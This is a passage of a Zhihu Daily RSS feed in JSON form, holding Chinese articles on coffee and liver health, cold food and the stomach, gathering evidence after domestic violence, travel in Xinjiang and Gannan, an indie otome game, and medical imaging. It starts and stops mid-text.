alt=\"\"></figure><p>当然，这项研究的结论因为其样本人群数量很大，所以还是有相当的可信度和说服力的。但对于我们中国人来说，也只能作为一个参考，并不能完全照搬结论。原因如下：</p>\n<p>首先，因为中国人与欧洲人群存在着很大的遗传背景差异，同时生活环境和饮食习惯也有很大的差异，而这项研究的人群主要都是英国人，因此是否同样的结论能够在中国人群数据上重复，还是一个未知数。</p>\n<p>其次，所谓“抛开计量谈效果，就是耍流氓”，虽然近年来，我国的咖啡饮用量正在逐步上升，但相对而言还是远远低于欧美人群的。比如这项研究里，喝咖啡的人群，其每天饮用量的中位数是 2 杯，而我国人群对咖啡的平均饮用量明显是要低于这个量的。因此，是否摄入咖啡需要满足一定的量，才会起到保护肝脏的作用，仍然是一个值得进一步研究的问题。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d212707b5f285c0cefbf2776f2139c72_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/468425699\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737623"},{"title":"食用冰镇西瓜或引发胃损伤，你怎么看待？夏天有哪些东西推荐食用？","date":"2021-06-30 23:06:43","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/eda6f46ab_l.jpg?source=8673f162\"><span>魏玮，</span><span>丁香诊所内科医生</span>\n<a href=\"https://www.zhihu.com/question/468410466/answer/1966567259\" hidden>阅读原文</a>\n</div>\n<div>\n<p>可能得先去定义什么叫做「损伤」。</p>\n<p>吃冷的东西有可能让你不舒服。接触到冷食的口腔、胃肠会发出信号告诉大脑：「我们冷了」。负责感知冷的温度感受器，大约在 25℃ 之下就开始启动了，10 几度的时候会更欢实。冷信号被传递给大脑，你先会感觉到这种「冷痛」。然后后续可能还有其他，有的来自于人体感知到冷后的天然保护动作：胃食管痉挛减少产热、更多的消化液分泌提高局部温度。有的更复杂些，跟脑肠轴有关，后天事件能影响到，比如如果你从小就被灌输建立了冷会让我不舒服，口腔一接触到冷，胃肠就会做出一系列敏感度的变化，让你更快有便意有腹痛。</p>\n<p>这些可能都会存在，具体呈现到什么程度，取决于到底有多冷，你是不是有建立这样跟冷的反应关系，以及吃冷食给你带来的快乐（更甜更冰爽）是不是足够掩盖这些不舒服。如果把这些可能的不舒服，也叫做损伤的话。那确实吃低温的东西「损伤」了胃。但我们要知道，冷痛，真的很表面。除了传递出去冷信号之外，直接跟冷接触的黏膜并不会因此受到实际伤害。黏膜的样子、功能都是正常的，也不会有未来出现的麻烦。过去也就过去了，不留下一丝痕迹。可能随着你越吃越多，而越能耐受跟身体不太一样的温度，对冷热变化都不会那么的敏感。</p>\n<p>吃冷在这一点上跟吃热食是不一样的。也许你（主要是你的上一辈们）也可以适应更热的食物而不会有当时的不舒服，但这些热暗中是一点点累积伤害黏膜的。食物超过 65℃，食管癌的风险就会慢慢增加。</p>\n<p>所以年轻人爱吃冷就让他们吃去嘛。对冷热食物的选择，我们不应该给出不必要的限制，而是直接一点儿说，<strong>吃的冷点儿热点儿确实可能让你有些不舒服，但你就是你，你可以根据自己的情况选择适合自己的温度，快乐就好。如果你喜欢吃点儿热的，那也尽量注意不要超过 65℃。</strong></p>\n<p>冷食就没有要注意的下限了，反正我们平时能耐受的冷藏冰镇温度，都不至于出现真实身体伤害。要做什么健康科普，就更应该告诉别人注意冷藏保存的卫生，冰箱储存直接食用的食物一定要是密封的，不要切开西瓜随便就放进冰箱里，这样有可能导致李斯特菌等感染，更不要拿出来之后放置很久再吃，那样的话患上感染性疾病的风险更高。</p>\n<p>当然，严格说，确实也有罕见的例子，人真的被吃进去的东西冻伤了。还真是特例。最近，BMJ 刊登过一篇个案报道。有人吸食笑气的时候太着急，压缩气体释放局部大量吸收热量造成了极冷环境，嘴巴就被冻伤了。这算是正儿八经的「吃冷」损伤了……</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-856056e9afb30dbb1d8505065f5f359d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>图片来源及参考文献：Nabben T, Weijs J, van Amsterdam J. Problematic Use of Nitrous Oxide by Young Moroccan–Dutch Adults[J]. International journal of environmental research and public health, 2021, 18(11): 5574.</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/468410466\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737627"},{"title":"第一次被家暴后应该怎么处理？","date":"2021-06-30 23:06:35","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/e747f3a9ac831afcf4154c790945f13a_l.jpg?source=8673f162\"><span>从八品盛京游牧副尉，</span><span>略懂法术</span>\n<a href=\"https://www.zhihu.com/question/294135159/answer/615065515\" hidden>阅读原文</a>\n</div>\n<div>\n<p>实施家庭暴力是可以判离婚的具体情形之一，从最大程度的保护自身来讲，遭遇家暴时留存证据，对于争取离婚、财产分割、争取孩子抚养权都非常有利。下面说说家暴取证。</p>\n<p>最常用的证据就是<strong>伤情照片</strong>，挨打了第一时间要把伤情照片拍下来，不然有些淤青啊肿胀的地方过一段时间就恢复了，注意不能仅仅拍局部，到时候法官怎么知道是不是你呀。所以要尽量拍露脸的全景照片。比如蒋劲夫家暴，受害者拍的照片就很有说服力。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3f6c320fef17d683b4d823ad0cfb950b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>一定要在伤势看起来最严重的时候拍</figcaption></figure><p>再有就是要<strong>保存好就诊证据</strong>，就诊后务必把医疗本啊、诊断证明啊、医疗报告、住院病历等保存好。因为这些材料都是在你向医生陈述伤情时形成的，相当于医生给你做的笔录。还有的打骨折的，拍了片子也要留好。这些都是法庭可以采纳的有力证据。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-7562ac94dc31e98468219d6f4e7486f7_720w.jpg?source=8673f162\" alt=\"\"></figure><p>最重要的就是<strong>报警问题</strong>，如果觉得事态很严重一定要报警，情绪再失控的人听到警察俩字也会注入一丝理性，这对保护自身安全很有利。如果当时没机会报警，那么事后也不能心软，也要第一时间报警，原不原谅是以后的事，先让警察看看伤再说。有的小区里为了便民会留下所属派出所电话，因为出警时间会缩短，但注意了，报警时一定要打 110 报警，而不要打什么派出所电话，因为 110 报警会有<strong>报警记录</strong>留存，他们有个接警系统，接电话就需要往系统里输入时间地点什么事，而派出所电话往往没有报警记录。</p>\n<p>警察来了后一看是两口子打架，肯定先调解，这时候你就得<strong>要求警察做笔录</strong>，为的就是怕打人的以后不认账，照片、医疗证明都可以证明你受了伤，但并不能直接证明是谁打伤你的啊，现在警察现场白纸黑字给你记下来，以后想不认账都难。</p>\n<p>警察一般不会因为两口子打架拘留，因为拘完了自己麻烦事也多，所以一般都会极力调解结案，不能就让警察叔叔就这么走了，调解结案行，得给出具个<strong>告诫书</strong>，告诫书啥意思？这是《反家暴法》立法者考虑到家暴取证难的问题，特意安排给公安机关的一项法定文书。就是告诉打人的，告你奥以后老实点不许再动手了，再动手收拾你奥。就这么个东西。告诫书有啥用呢？跟笔录一样，相当于警察给你出的他打你了的证明。</p>\n<p>警察看大面上如果伤的不是很严重，一般不会主动提伤情鉴定的事，多一事不如少一事。但如果你自己觉得被打的挺严重，那也不能委屈了自己，可以当着警察的面要求做<strong>伤情鉴定</strong>，万一是轻微伤或是轻伤呢？那你就牢牢的掌握了主动权。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5edaa7697d7e7ea3474b4d85944441b2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>最后记得要<strong>民警的联系方式</strong>，你生成了这么些证据，又报警记录，又笔录告诫书的，以后上哪找去啊，公安局忙法官更忙，如果法官以后调取证据的时候知道找谁，他也乐意帮你去找。</p>\n<p>有的人面子薄，不好意思将家丑暴露在公权力下，或者干脆不忍心报警，怎么办呢？也不是一点办法没有，让打人的<strong>写保证书</strong>，写完了签名，留好。保证书大家都知道吧，小时候都写过，其关键用语是“我以后再也不.....”。保证书有啥用呢？跟笔录一样，还是证明人家打你了。</p>\n<p>还有一种常用证据就是<strong>证人证言</strong>，有时候家暴发生的地方不在那么私密的空间里，被亲戚、街坊邻里看到了，那么他们的证言就可以证明家暴的发生。如果被打的时候谁也没看到，但是你跑到亲戚朋友家里了，哭诉这个挨削了啊，你瞅瞅啊，亲戚朋友听你这么一说，再一看你这青一块紫一块的，那么他把这个过程在法庭上复述一遍，仍然可以构成间接证据。</p>\n<p>如果挨削已经形成常态了，那不妨<strong>提前准备好摄像头</strong>之类的设备，或者整个录音笔提前开开，这玩意比上边说的那些个可都好使，可以直接证明家暴的发生。如果没有事先准备，也需要有个意识，挨削了尽量往有摄像头的地方跑。</p>\n<p>还有的经常挨削的，街坊邻里都知道了，居委会村委会可能还到家里做过调解工作，如果调解过，就说明知道这事，可以让当时介入过你们家事的这些机构（街道、妇联、村委会居委会）出具个<strong>书面证明</strong>，也不用让机构证明有家庭暴力，你就把当时调解的情况写明白，就足够了，而且证据能力很强，作用还是证明人家打你了。</p>\n<p>家庭暴力的特点是多次发生，第一次没处理明白很可能就有第二次，有的平时像个人似的，打人时候控制不住自己，等打完了也清醒了，咣咣磕头道歉，然后心一软原谅了，在寄希望于对方改过的时候再次挨削。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-bc4832b8a322aa6412ba7bce88b6210d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这种人渣，能离了最好，实在离不了，也要构建均势力量，<a href=\"http://link.zhihu.com/?target=https%3A//baike.so.com/doc/6599966-6813750.html\" target=\"_blank\" rel=\"nofollow noreferrer\">均势</a>是地缘政治学中的一个词，是指国际体系中的国家试图保持力量的平衡，以防止任何国家占据优势地位。在家里也是一样，不能总让一方占据打人的绝对优势地位，比如一个会空手道的妻子挨打的几率会比其他女性小。如果一方优势地位已经确立，你很弱小根本打不过对方，那就要想办法限制对方发挥这种优势，或者让对方知道发挥这种优势的代价很大，比如有一个强壮的哥哥，比如争得当地警方同情，比如去对方单位领导那里把对方批判一番，以实现另一种形态的制衡。最后，防止家暴最重要的手段还是选对人，过滤了人渣，也就远离了家暴。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/294135159\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737618"},{"title":"旅行中的哪一刻令你感到「祖国的山河美如画」？","date":"2021-06-30 23:06:27","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-3565ac1a879acbac71ec6d4ebf79eff6_l.jpg?source=8673f162\"><span>在远方的阿伦，</span><span>自驾旅行作者，独立纪录片导演，星球研究所/天空之城特约摄影师</span>\n<a href=\"https://www.zhihu.com/question/468764145/answer/1968382521\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>2021 年，我在新疆从冬天跨越到了春天，终于等到了新疆最美的春天</strong></p>\n<p>这次的旅途包括博州的赛里木湖、木特塔尔沙漠胡杨，古尔班通古特沙漠，伊犁河谷的那拉提山、库尔德宁雪岭云杉森林、 那拉提草原、昭苏草原、特克斯，昌吉 101 省道、硫磺沟和棉田等地，依旧由我独立拍摄和后期完成。</p>\n<p>“在时冻若严寒，归来恍如盛夏”是这次旅行给我的最深印象。因为接连几场的暴风雪不仅打乱了我的拍摄计划，还冻结了天山南北以及伊犁河谷地区的所有农牧生产活动。可以说，这场来自西方的寒冷空气对我和其他游客而言，是何其的不幸；而且对于当时当地的农民和牧民来说，也是影响深远。 <strong>但是当我返回上海重新开始拼接整个旅途的记忆碎片时才发现我又是何其幸运的从新疆的冬季，穿越到了新疆的春季；并且在这过程里，见证了天山以北包括伊犁地区万物开始苏醒的蓬勃生机。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-3089da6b0274743b039ff09a04074397_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-34e825584bbd8961a8d9fb81ec1e1f98_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-9c30b38228697bafc12e2a38a6aa62b0_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-c5fbefcf62e6484f22bcc52695dadefa_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-6a3651f9b57a68f6d16e1646bb592c26_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-a53a45572e2bd15b9acafb345c6edcf9_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我在昌吉偶遇了的这家普通农户家的棉田，正赶上他们 2021 年的第一天播种，通过北斗定位、播种、安放滴灌带、覆膜一次完成，我也帮着一起干了一天的农活。</p>\n<p>关于这次天山环线的旅行详情，我会在接下来的文字版里再述，而至于新疆，我想当你看完这段文字时，新疆基本就已经处在最适合旅行的时节里了。</p>\n<p><strong><strong>我记得甘南这部片子的弹幕和评论里最多的就是，这不是欧洲吗？这不是阿尔卑斯山吗？不，这是中国甘肃省甘南藏族自治州的江迭公路</strong></strong><strong>“洛克之路”，冰川造就的远古巨兽</strong></p>\n<p>这条路，自驾去过的人不算少，但从全国自驾游的尺度来看，就算是到了如今，那也算是小众中的极小众。<strong>其中风景最为精华，最为无敌的路段，集中在光盖山的囊黑卡（也叫那黑卡，纪录片里有注解）到与“车巴沟”汇合的路段。</strong></p>\n<p>自从 2020 年 12 月纪录片发布以来，很多朋友先后前往了，尤其在今年的五一长假大家都给我发来了“远方回声”，可惜那时囊黑卡以西积雪覆盖无法通行。6 月以后就迎来这条路最美的时候了。随便放几张图以供舔屏。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2c14d9fe7fed62a9e57c86559e2a059b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-ada857d40bc8b0f75e6b19982319db54_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-d29cae8fd0704d2f3778d36bd7d31887_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-34581af4b48245bcf3c22412de21ac9c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>从囊黑卡（那黑卡）以西到江迭公路垭口的 30 公里是这条路最最精华的部分，大部分是在几乎完美的冰槽谷里穿行。根据一份地质考察资料，据说最盛时期，这里的冰川有 120m 厚。</p>\n<p>古老的冰川消融之后，露出了一个发育完美的 U 形谷；高大的云杉在这里自由自在的生长，这每一棵云杉，都像是城里的每一栋高楼，只是在这座绿色城市里，没有车水马龙，只有鸟语花香。在这种巨大山谷里穿行，一切都显得微不足道......我觉得在这个山谷里住上三天，应该是对这种极致美景最起码的尊重。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9c3acf1882c8988837223ac050886326_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-4ed930f38efb129cf3b80b8a33a9a6d1_720w.jpg?source=8673f162\" alt=\"\"></figure><p>当然除了这条我心目中 Top5 的自驾之路，甘南还有更多小众风光和人文静候大家——</p>\n<p><strong>真正的精华藏在村前村后茂密的森林里的扎尕那</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7018c5e972ae1042d7b7ed01dfa64549_720w.jpg?source=8673f162\" alt=\"\"></figure><p>最近几年，网络平台铺天盖地的对扎尕那的形容——“人间天堂“，”伊甸园“以及”最后香巴拉”这，让我在到达这个地方之前并没有太大的兴趣。嗨，网络宣传嘛！谁不知道呢！</p>\n<p>直到我远远看见“扎尕那山”为止：由于落差大，所以现场看上去的那种体量感，确实跟照片和视频里的它有着巨大差距——这是我在疫情之后第一次出远门，所以看啥啥都好。</p>\n<p>就我的理解，扎尕那村以及村中密密麻麻的民宿是整个光盖山区，探索自然景观的大本营，即交通枢纽和补给站。</p>\n<p>因为扎尕那真正的精华，被藏在了村前村后茂密的森林里，以及这里通向光盖山深处的石门后。随意找一条沟往里深入，你会发现原来<strong>扎尕那</strong>不是在村中，而是雪藏在这些石灰岩峡谷背后——那里，才是真正的原始森林和桃源秘境。请个向导再往上走，就是当地人的高山牧场，和洛克当年真正走过的<strong>【洮叠古道】</strong>东西线。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-2186f14c85d4e532617a7ad33be7e60d_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>甘南最后的秘密，甘加秘境</strong></p>\n<p>这里有安多藏区的最高学府，拉卜楞寺。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-1c94c853f05ccdac112e8b3dea7636b3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>甘加白石崖粗看上去地质构造类似洛克之路深处的光盖山，但是视觉体验还是有所不同。在这里，几百米高的石墙在草原上突然一字排开，抬头远眺会觉得它们像海浪一样朝你席卷而来。你还可以沿着白石崖峡谷往上，可以到达崖顶的牧场。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-51e752b9abc8e06258f698588a8f7573_720w.jpg?source=8673f162\" alt=\"\"></figure><p>白石崖下神秘的【八角古城】</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-726bbe35b2af4641541dc0b771b333c7_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>在这里，还有一条小众得不能再小众的密道，从黄土高原过渡到青藏高原——更多细节，可阅读我的甘南自驾旅行纪录片及游记</strong></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/337072043\">在远方的阿伦：甘肃以南，雪藏深闺的无敌路线，我要在此做个吃泡面的神仙</a></p>\n<p><strong>其实走在神州大地的每一天，我都在感叹祖国的山河美如画</strong></p>\n<p>以下帖子整理了我从 2015 年开始走过的中国绝美自驾路们，包括我<strong>川藏南北线、青藏线、新藏线、独库公路、天山景观大道 S101（我的宝藏）、北疆线（我的宝藏）、青甘环线、黔西南、内蒙蘑阿公路（草原 - 火山 - 森林）、甘南洛克之路</strong>等等</p>\n<p><a href=\"https://www.zhihu.com/question/335209662/answer/1492002257\">有哪些风景绝美的自驾旅行路线？</a></p>\n<p><strong>问拍摄器材的，请移步这里</strong></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/360011963\">在远方的阿伦：《围城随笔》旅拍物资清单，持续更新</a></p>\n<p>不过其实真的跟器材没啥关系，因为独自旅行并悉心记录，并不单单只是希望大家关注我和我的旅途，而是想通过一次漫长的游历来向读者揭示，这围城之外你未曾察觉过的，不曾关心过的大世界和小人物——<strong>旅行只是个容器，容器里的，都是对大世界和小人物的好奇，关心和探索。</strong></p>\n<p>即便是在片中纵横驰骋，享受美景的我，片后在剪辑制作时那些无数个难熬的日与夜，是观众甚至挚友都无法感知的。<strong>这是观众茶余饭后，手指匆匆划过的闲余时间；但却是创作人加班熬夜，风雪夜归所付出的所有时光。</strong></p>\n<p>最后，感谢你，看到这里。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/468764145\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737601"},{"title":"如何评价单机乙女向游戏《风起长安：驭骨人》？","date":"2021-06-30 11:30:10","description":"\n<p>大家好，我是《风起长安·驭骨人》的制作人非离，同时也担任了剧本写作和演出设计的工作。</p>\n<p>很高兴能在知乎上与大家聊聊我们新上线的这款乙女向单机游戏。</p>\n<p>这一作的诞生原因很多，但总归来说，是我们有故事希望能讲给大家听。</p>\n<p>作为一个因共同兴趣聚拢在一起的制作组，我们面临的问题很多，如大家所说……主要是资金问题。等到资金问题稍有缓解时，《风起长安·驭骨人》已经封包小半年了，这一点现在想来也很遗憾。</p>\n<p>游戏发售后，我看到最多的反馈是世界观很大，但剧本太短，很多问题没讲清楚。</p>\n<p>之前我有说过，《风起长安·驭骨人》是我们的心血之作，也必定成为遗憾之作。</p>\n<p>为了游戏能较完整地出现在大家面前，我将女主设置为非漩涡中心的人物，省去了大篇幅的权力斗争剧情，能更专注于感情线。</p>\n<p>同时我注意到许多玩家表达了对本作中其他女性角色的喜欢，我非常开心。除去男女主的情感描写，塑造女角色之间的友谊是我非常珍视的部分。</p>\n<p>制作时，我对剧情进行了优先级划分，最终将有限的资金分配到制作较为重要的主线剧情上，忍痛舍弃了部分支线剧情，包括其他角色剧情、回忆剧情等。</p>\n<p>这么做的益处很多：我能将剧情演出做得更为精致、细腻，做到了多CG、全语音配置，能一遍遍去磨演出设计、反复测试那0.5秒与1秒的视觉差别。</p>\n<p>缺点也很明显——世界观没铺开，给玩家留下了不少疑问。</p>\n<p>但好在《风起长安》初步构建了一个驭骨人的世界，后续我们会在同一世界观下继续制作新游戏。</p>\n<p>能走到今天，非常感谢玩家们的包容，能够包容我们的缺点、对我们进行鼓励。</p>\n<p>在此还要感谢发行商咕咕工作室，在我们最困难、几乎无以为继的时候提供了很多支持，《风起长安》能顺利做完，离不开咕咕小姐姐们的全力支援。</p>\n<p>目前我们已经在规划新作，非常感谢玩家对轻梨工作室的支持，我们会继续坚持下去。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/qing-li-gong-zuo-shi?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">轻梨工作室</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/464467926/answer/1968625798?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/413716759?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为何手游《江南百景图》没有常州府？</a><br><a href=\"http://www.zhihu.com/question/266297957?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">网易游戏为什么大多是和风游戏（手游）？</a><br>\n","link":"http://www.zhihu.com/question/464467926/answer/1968625798?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"医院做的这些「拍片」检查，你可以多了解一点","date":"2021-06-30 08:00:00","description":"\n<p>随着科技进步，医学在不断发展，诊疗时的辅助检查手段也越来越先进。推陈出新的辅助诊断医疗器械和不断更新的各种先进影像学检查技术极大地提高了诊断的阳性率，也给医务工作者带来便利：毕竟听诊器发明之前医生只能紧贴着患者的胸壁听诊，根据接触患者前后消毒的原则，如果现在仍然没有听诊器，作为医生不但手洗烂，脸也要洗烂。</p>\n<p>然而检查手段的进步却给患者带来了更多的困惑，人们在医院就诊时常常奔波于各个检查诊室和交费窗口，晕头转向的同时也不免嘀咕：「怎么就知道给我开检查啊？拍片子会不会有辐射啊？开这么贵的检查是不是有什么回扣啊？」基于以上背景，我将简要介绍一下目前常见的影像学检查的作用和优缺点，让读者对自己做的检查有一个基本的了解。</p>\n<p>需要注意的是，本文旨在为读者科普各类影像学检查，<strong>不推荐</strong>读者对照此文「自行选择」检查。本文不构成任何医疗建议，具体问题请线下就诊并遵医嘱。</p>\n<p>医学影像学包括影像诊断学和介入放射学。考虑到专业性和实用性，本篇仅对影像诊断学中临床常见的影像学检查做简要说明。另外，由于儿童、孕产妇等人群的生理、病理特殊性，本篇介绍内容不涉及以上特殊人群。当然，我并不是物理专业，对具体原理的描述可能不尽详细，若有不准确之处欢迎相关专业人士指正。</p>\n<h2>超声成像：不止是 B 超</h2>\n<p>超声成像是指利用超声波的物理特性和人体组织的声学特点进行成像，并用于辅助诊断的技术。<sup class=\"ss-footnote\" href=\"\" title=\"人卫第九版医学影像学\" footnote-id=\"1\">1</sup>通俗地说，就是超声仪器通过换能器（通常称为探头）发出不同频率的超声波，接收经过人体组织反射、散射、折射、衍射等后返回的声波，再经过仪器处理形成图像。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/74e7d0adde9a039e7734c8bd276703a3.png\"><figcaption>左图为超声检查示例，医生手持接触患者的部分即为换能器（探头）；右图为飞利浦超声仪器。图源飞利浦官网。</figcaption></figure><p>超声成像根据成像的不同技术和显示方式分为 A 型超声、B 型超声（二维超声）、M 型超声、D 型超声（多普勒超声）等。具体的成像原理专业性较强，我们就不细讲了，我用简单粗暴的方法帮你理解这几种超声：</p>\n<p>A 型超声成像为一维波形，目前临床上应用较少。M 型超声成像也是一维波形，只看一条取样线上的状态，主要应用于心脏检查，能够检查心脏结构、观察运动轨迹和测量前后径、室壁厚度、心功能等。也就是说一般你用不着，用着了就是看心脏。</p>\n<p>最常用的 B 型超声成像（B 超）为二维切面，为临床上广泛应用，它也是 M 型超声和 D 型超声的成像基础。你可以简单地理解为医生的探头戳在哪，就在哪打一个切面来看。因为人体是立体的，医生就需要选取不同的切面来进行检查——这就是为什么超声医生的探头总是在你身上戳来戳去还让你时不时翻个个儿，意思就是拿探头给你切出几个面来看一下。你不妨想象一下<strong>自己是一锅菜</strong>，医生的<strong>探头是炒菜的锅铲</strong>，锅铲插到哪里就能看到哪里，如果哪个地方可能有问题（就像菜不熟）还需要增加几铲子。</p>\n<p>D 型超声成像即多普勒超声成像，包括频谱多普勒、组织多普勒成像（TFI）、彩色多普勒能量图（CDE）和多普勒血流成像（CDFI）等。顾名思义，多普勒超声成像是以多普勒效应为基础成像的。这里插播一条高中物理知识复习：多普勒效应，即当一定频率的超声波从声源发生并在介质中传播时，如遇到与声源做相对运动的界面，则其反射的超声波频率随界面运动的情况而发生改变。物体靠近，声波变「密」，远离则变「稀」。基于以上原理，D 型超声主要检查的是能与声源（探头）做相对运动的界面（能运动的组织和血流等）。所以 D 型超声虽然听起来高级，但只有在「动起来」的地方才有使用价值，并不是万物皆可多普勒。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/8f86435b528d11a88407c8086d5cbb4e\"><figcaption>图为多普勒效应。（图自《生活大爆炸》S01E06）</figcaption></figure><p>目前临床常见的两种超声仪器分别为 B 型超声仪和彩色多普勒超声仪。需要注意的是 B 型超声仪并不是只有 B 型超声成像功能，通常还兼有 M 型超声和频谱多普勒成像功能。由于 B 型超声仪的广泛使用，「B 超」这个词语也为广大群众所知晓，也常常被用来代指所有超声检查——这其实是不准确的。当然，作为患者，这一点点称呼上的小瑕疵实在是算不了什么。毕竟医生早就练就了对大夫护士护理员丫头闺女喂嘿甚至服务员等任何称呼都能笑脸相迎，以及听到各种五花八门的病情描述都能平静回应并试图理解沟通的本领。只要能表达清楚你的意思，说什么都是可以的。</p>\n<p>同样地，彩色多普勒超声仪不仅可以进行多普勒超声成像，也兼有 B 型、M 型成像等功能，先进机型还可以进行静态和动态三维成像、超声造影和声学定量等检查。</p>\n<p>超声波是<strong>机械波</strong>，无放射性损伤，也就是人们常说的不「吃线」。由于超声检查是无创、动态的检查，可应用的组织、部位广，操作相对简便（可进行床头、术中检查）且价格相对较低（单部位百元左右），故广泛应用于临床，尤其在<strong>甲状腺、乳腺、淋巴结和腹部实质器官</strong>（如肝胆脾胰）以及<strong>妇科、产科</strong>影像诊断上应用较多。但由于骨骼、肺部和胃肠道中的气体对超声波发生全反射——在声像图上就是黑糊糊一片——超声检查在以上组织、器官的诊断作用有限。另外，上面讲过超声是人为地选取切面进行成像，所以虽然超声检查的切面选择有其固定标准，但由于人体组织的复杂性和病变的多样性等原因，检查过程中不一定能够取到「有问题」的那个切面，且对医生的经验和技术水平有较大的依赖性。</p>\n<h2>X 线成像技术</h2>\n<p>X 线是一种放射性的特殊光线，具有透视性、可吸收性等。利用 X 线进行成像的技术称为 X 线成像技术，主要包括 X 线成像和 X 线计算机体层成像（computer tomography，CT）。生活中通常以「X 线」专指「X 线成像」，而用 CT 来指代「X 线计算机体层成像」。当然说了这一段你应该已经被我绕晕了，没关系先把关系图放在这里，然后我将用最<s>粗暴</s>简单的方式来进行说明。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/7efc87a6e3f8fbe9981439372a15c6d5.png\"></figure><h3>X 线成像——传统 X 线、CR 和 DR</h3>\n<p>我们首先来了解一下 X 线成像的原理。X 射线是一种波长极短的电磁波，具有穿透性、可吸收性、荧光效应和感光效应。X 线成像的基本原理（通俗版）是，X 射线照射到人体，由于人体不同组织的密度和厚度不同，对 X 线的吸收程度也有所不同，所以最终呈现出黑白不同（通常称不同密度）的图像。X 线成像主要包括传统 X 线，计算机 X 线成像（CR）和数字 X 线成像（DR）。三者的区别主要是成像技术的不同，传统 X 线是以胶片成像，CR 和 DR 则是将图像进行像素化和数字化。其中 DR 成像时间较短，能够进行透视检查，且能进行后续图像技术处理等高级功能，广为临床应用。以上技术的选择与应用受被检者的病情和医院、医保实际情况等影响，大家只要知道「透视、X 线、平片、CR、DR」都是 X 线检查就可以了。</p>\n<p>生活中读者都对 X 线有一定的了解，可能知道白色的是骨头，灰黑色的是其他。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/29/article/fff08c951a01e87e37dd6bc486cb6e34\"><figcaption>图为网络表情包，来源不详，但这个点赞看起来很有力度。</figcaption></figure><p>不同组织、部位呈现不同的颜色，其实与组织密度有直接的关系。组织密度越高，对 X 线的吸收就越多，最终成像的颜色也就越亮，所以 X 线成像中，白色部分称为高密度，灰黑色称低密度。若人体产生病变造成组织密度发生变化，达到一定程度后就会在成像上出现黑白灰度变化。</p>\n<p>X 线成像是叠加图像，即 X 线照射部分从前到后所有层级图像的叠加，如同「透视眼」视角。所以，X 线成像也被称为透视，比如学校体检和公务员、事业单位入职体检的「胸透」项目就是指胸部后前位 X 